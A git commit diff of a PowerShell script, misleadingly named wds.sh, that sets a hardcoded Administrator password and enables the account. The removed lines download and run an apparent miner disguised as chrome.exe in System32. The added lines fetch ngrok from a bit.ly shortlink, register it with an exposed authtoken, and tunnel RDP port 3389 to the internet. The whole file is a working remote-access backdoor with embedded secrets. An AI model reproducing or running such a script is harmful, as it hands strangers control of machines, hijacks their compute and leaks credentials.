b05923b00d59513cc73ee3d353db56dbbaf9191d
p4n1k <46290080+p4n1k@users.noreply.github.com>
2022-03-14 17:47:35 +0700

    Update wds.sh

--- wds.sh
+++ wds.sh
@@ -1,8 +1,9 @@
 Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Pandajiwa123" -Force)
 Get-LocalUser -Name "Administrator" | Enable-LocalUser
-Invoke-WebRequest https://github.com/p4n1k/mnr/releases/download/winrtm/rtm-mnr.zip -OutFile rtm.zip
-tar xf rtm.zip
-Copy chrome.exe C:\Windows\System32
-cmd /c echo ./chrome.exe >a.ps1
+Invoke-WebRequest https://bit.ly/3t58pae -OutFile ngk.zip
+tar xf ngk.zip
+Copy ngrok.exe C:\Windows\System32
+cmd /c echo ./ngrok.exe authtoken "22vD0A9L00nyb2sPamKdgaVcGsG_77prNN7CATVXBWkd4DaRm" >a.ps1
+cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
 cmd /c echo ping -n 3480 127.0.0.1 >>a.ps1
 .\a.ps1
